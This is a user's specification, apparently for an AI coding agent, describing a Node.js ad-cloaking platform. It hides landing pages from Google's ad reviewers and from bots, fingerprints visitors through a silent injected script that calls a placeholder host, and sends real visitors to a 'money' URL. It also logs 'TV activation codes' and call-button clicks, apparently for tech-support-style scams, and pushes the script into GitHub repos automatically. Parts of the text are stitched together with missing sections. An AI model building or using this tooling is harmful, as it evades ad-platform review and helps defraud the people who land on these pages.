Build me a self-hosted traffic cloaking and lead management platform 
called FILTER. This is a complete, standalone Node.js application. 
It has two parts: a public-facing website that real visitors land on, 
and a private admin panel that I use to monitor and control traffic. 
Everything runs in a single Node.js file (index.js). There is no React, 
no build step, no frontend framework. All HTML is rendered server-side 
as template literal strings inside index.js.

TECH STACK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Runtime: Node.js
Framework: Express
NPM packages needed: express, express-session, bcryptjs, pg, crypto (built-in)
Database: PostgreSQL (primary). When DATABASE_URL env var is set, use pg Pool 
to connect. All data persists to Postgres. When DATABASE_URL is not set, 
fall back to JSON files in a data/ folder.
Static files: served from a public/ folder using express.static.
Everything else: all routes, all HTML, all logic live in index.js.

and migrate them into Postgres automatically.

ALTER TABLE cloaker_logs ADD COLUMN IF NOT EXISTS page VARCHAR(500);

IN-MEMORY CACHES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Keep four in-memory caches that are populated on startup and updated on 
every write:
  _cacheLogs     — array of log objects, newest first, max 10,000 entries
  _cacheLeads    — array of lead objects, newest first, max 5,000 entries
  _cacheSites    — array of site objects
  _cacheSettings — settings object

Also keep an in-memory Map called ipFreqStore that tracks the last visit 
timestamp per IP address (used for repeat-click blocking). Window: 24 hours. 
Max store size: 10,000 entries (evict oldest when full).

Also keep an in-memory Map called activeVisitors that tracks visitors seen 
in the last 5 minutes, keyed by IP. Each entry stores:
  ip, country, city, isp, ua, siteId, lastSeen (timestamp), decision, page
Purge entries older than 5 minutes every 60 seconds.

SITE / MULTI-SITE MODEL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

The system supports multiple independent "sites". Each site object has:
  id                — unique string, e.g. "site-" + Date.now()
  name              — display name
  domain            — the website domain (no protocol)
  apiKey            — UUID, generated with crypto.randomUUID()
  moneyUrl          — where real (allowed) visitors get redirected
  safeUrl           — where bots/reviewers get redirected
  adUrl             — Google Ad URL reference (stored, not used in logic)
  githubRepo        — full GitHub repo URL (for auto-injection)
  railwayProjectId  — Railway project UUID (for deploy triggering)
  railwayServiceId  — Railway service UUID
  enabled           — boolean, whether cloaking is active
  blockedIps        — array of manually blocked IP strings
  allowedCountries  — array of 2-letter country codes
  isDefault         — boolean, only one site has this true
  deployStatus      — "pending" | "building" | "live" | "failed"
  createdAt         — ISO timestamp

There is always one default site. Additional sites can be added from 
the admin panel. Each site is independently configurable.

THE CLOAKING SCRIPT (injected into client websites)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This tiny JavaScript snippet goes in the <head> of the client website. 
It fires silently when the page loads, sends a fingerprint to the server, 
and immediately redirects based on the server's decision. 
The admin can copy it from the Script tab of each site.

The script:
(function(){
  var _h='https://YOURDOMAIN.com', _k='SITE_API_KEY';
  try {
    fetch(_h+'/api/v1/pixel', {
      method:'POST',
      headers:{'Content-Type':'application/json','X-Client-ID':_k},
      body: JSON.stringify({
        ua: navigator.userAgent,
        sw: screen.width,
        sh: screen.height,
        wd: !!navigator.webdriver,
        pl: (navigator.plugins||[]).length,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        pg: window.location.pathname
      })
    })
    .then(function(r){ return r.json(); })
    .then(function(d){ if(d && d.url) window.location.replace(d.url); })
    .catch(function(){});
  } catch(e) {}
})();

CLOAKING ENGINE — POST /api/v1/pixel
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This is the core endpoint. It receives the fingerprint from the script, 
runs 10 checks in order, and responds with { decision, url }.

The site is identified via the X-Client-ID request header (the apiKey).
If no key is sent, use the default site's settings.

Read from the request body: ua, sw (screen width), sh (screen height), 
wd (webdriver boolean), pl (plugin count), tz (timezone string), 
pg (page path, max 500 chars).

Get the real IP from X-Forwarded-For header first, then req.connection.remoteAddress.

CHECKS (run in this exact order):

Check 1 — Cloaking disabled: if settings.enabled is false, always allow, 
log with reason "disabled", return moneyUrl.

Check 2 — Manual IP blocklist: if the visitor's IP is in the site's 
blockedIps array, immediately block with reason "manual-block". 
(No external API call — fast path.)

Check 3 — Repeat-click: if the same IP visited within the last 24 hours 
(check ipFreqStore), block with reason "repeat-click". 
Record the visit in ipFreqStore either way.

Check 4 — Bot user-agent: match the UA against a list of 35+ regex 
patterns including: googlebot, adsbot, bingbot, slurp, duckduckbot, 
baiduspider, yandexbot, sogou, exabot, facebot, ia_archiver, mj12bot, 
dotbot, semrushbot, ahrefsbot, majestic, rogerbot, screaming frog, wget, 
curl, python-requests, libwww-perl, java/, go-http-client, 
facebookexternalhit, twitterbot, linkedinbot, whatsapp, pinterest, 
slackbot, telegrambot, headlesschrome, phantomjs, selenium, webdriver, 
scrapy, crawler, spider, bot (word boundary). 
Block with reason "bot-ua".

Check 5 — Webdriver flag: if wd is true, block with reason "webdriver".

Check 6 — Screen size: if sw or sh is 0, block ("no-screen"). 
If screen is exactly 800x600 or 1024x768 AND plugin count is 0, 
block ("headless-screen").

Check 7 — No plugins on desktop: if UA says Windows or Macintosh (desktop) 
AND plugin count is 0 AND it's not a mobile UA, block ("no-plugins-desktop").

Check 8 — IP reputation via ip-api.com: call 
http://ip-api.com/json/{IP}?fields=status,country,city,regionName,isp,org,proxy,hosting
with a 5-second timeout. This returns: country code, city, region, ISP name, 
org name, proxy boolean, hosting boolean.

Check 9 — Country allowlist: if allowedCountries is non-empty and the 
visitor's country is not in the list, block ("country-block").

Check 10 — Suspicious ISP: check if the ISP or org name contains any of 
these keywords (case-insensitive): google, amazon, microsoft, cloudflare, 
digitalocean, linode, vultr, ovh, hetzner, facebook, apple. 
Also check any custom ISP keywords the admin configured. 
Block with reason "suspicious-isp".

Check 11 — Proxy/VPN: if ipData.proxy is true and vpnBlocking is enabled, 
block ("proxy-vpn"). If ipData.hosting is true and proxyBlocking is enabled, 
block ("datacenter").

After all checks: log the full entry to cloaker_logs and update the 
activeVisitors map. Respond with:
{ decision: "allow" | "block", url: moneyUrl | safeUrl }

LEAD CAPTURE — POST /api/v1/event
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

This endpoint fires from landing pages to track conversions. Always respond 
immediately with { ok: true } and process everything asynchronously.

Two event types:

type = "code_submit": visitor entered their TV activation code or submitted 
a form. Capture: ip, country, city, region, isp, ua, code (the text they 
typed, max 20 chars uppercased), screen, tz, referrer, utm_source, 
utm_campaign, utm_medium, utm_content, utm_term, gclid, siteId. 
Set called=false. Do an IP lookup via ip-api.com to get geo data. 
Save to cloaker_leads.

type = "call_click": visitor clicked the phone/call button. Find the most 
recent lead from the same IP within the last 30 minutes for the same site, 
set called=true and calledAt=now(). Update in DB and in memory cache.

Site is identified via X-Client-ID header.

GITHUB AUTO-INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

When a site has a githubRepo URL set and a GitHub token is configured, 
the system can automatically push the cloaking script into the repo's 
index.html file.

The function:
1. Parse the owner/repo from the GitHub URL
2. GET /repos/{owner}/{repo}/contents/index.html via GitHub API 
   (Authorization: Bearer {token}, Accept: application/vnd.github+json, 
   X-GitHub-Api-Version: 2022-11-28)
3. Decode the base64 content
4. If the content already contains the script (check for the hub URL), 
   replace it. Otherwise prepend it to the <head>.
5. PUT the updated file back via GitHub API with the SHA from step 2.

Store the GitHub token in a file at .local/github_token. 
The GITHUB_TOKEN env var takes priority over the file.

When a site is created and has a GitHub repo URL, auto-injection runs 
in the background. A "GITHUB ✓" badge appears on the site row in the 
admin once it succeeds.

RAILWAY AUTO-DEPLOY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

When a site has railwayProjectId and railwayServiceId set, the system 
can trigger a Railway redeploy after each script injection.

Store the Railway token in .local/railway_token. 
The RAILWAY_API_TOKEN env var takes priority.

Auto-discover Railway IDs: call Railway's GraphQL API 
(POST https://backboard.railway.app/graphql/v2) to list all projects 
and their services. Match by repoTriggers repository path. 
If a match is found, store the projectId and serviceId on the site.

Trigger redeploy: 
Step 1 — query latest deployment ID for the project+service.
Step 2 — call mutation { deploymentRedeploy(id: "...") { id } }.

Poll Railway for deploy status every 2 minutes and update deployStatus.

- Full timestamp

- Country, City, Region
- ISP, Org
- User Agent string
- Screen resolution
- Timezone
- Plugin count
- Webdriver flag
- Proxy/Hosting flags
- Decision and reason
- Page visited (code-styled)

At the top: "Clear Log" button with confirmation. Shows total entry count.

SERVER-SENT EVENTS (SSE) — REAL-TIME UPDATES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Endpoint: GET /{ADMIN_PATH}/events

The admin panel connects to this endpoint on page load and listens forever. 
The server sends these event types:

log        — a new cloaker_logs entry was just recorded. 
             The admin live feed and KPI counters update immediately.
lead       — a new lead was just captured. Lead counter badge increments.
siteStatus — a site's Railway deploy status changed. The badge updates.
statsUpdate — today's allow/block/total counts updated (sent after each log).
visitorsUpdate — the live active visitors list changed.

The SSE connection sends a ": ping" keepalive comment every 25 seconds 
to prevent connection timeout.

PUBLIC ROUTES (non-admin)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GET /               → serves public/index.html (your main landing page)
GET /safe           → serves public/safe.html (generic safe page for bots)
GET /offer          → serves public/offer.html (generic offer page)
GET /sites/:id/safe → a hub-hosted safe page for that site
GET /sites/:id/money → redirects to the site's moneyUrl

POST /api/v1/pixel  → cloaking engine (described above)
POST /api/v1/event  → lead capture (described above)

GET /admin          → 404
GET /admin/login    → 404
All other /{ADMIN_PATH}/* routes → require session auth

SECURITY DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

- app.disable('x-powered-by') — remove Express header fingerprint
- All admin routes gated by requireAdmin middleware 
  (checks req.session.adminAuth)
- Passwords hashed with bcrypt, cost factor 10
- Session cookie: httpOnly, secure in production, maxAge 8 hours
- ADMIN_PATH must be 4+ alphanumeric chars. Validated on startup.
- The admin URL is secret. /admin and /admin/login return 404.
- GitHub and Railway tokens stored in .local/ with mode 0o600
- All user-generated content run through an escHtml() function 
  before insertion into HTML templates

IMPORTANT NOTES FOR THE AGENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

- Everything in one file (index.js). No separate route files. 
  No React. No Webpack. No TypeScript.
- All admin HTML is a large template literal returned from a function 
  called adminDashboardPage(). The entire admin SPA is one string of HTML 
  that includes inline CSS and inline JavaScript at the bottom.
- Use EventEmitter to emit events (newLog, newLead, siteStatus, 
  statsUpdate, visitorsUpdate) and pipe them to the SSE endpoint.
- The ip-api.com call has a 5-second timeout. If it fails, use 
  fallback values (country=XX, empty strings for everything else) 
  and continue — never fail a visitor request because of an API timeout.
- When the admin changes a setting, write to both the DB and the JSON 
  fallback file. Always update the in-memory cache.
- The admin panel has its own URL that is NOT /admin. It is set via 
  the ADMIN_PATH environment variable. Make it configurable.
- Deploy to Railway. Add a PostgreSQL plugin in Railway and it will 
  auto-set DATABASE_URL.
- Set ADMIN_PASSWORD, SESSION_SECRET, and ADMIN_PATH as Railway 
  environment variables.
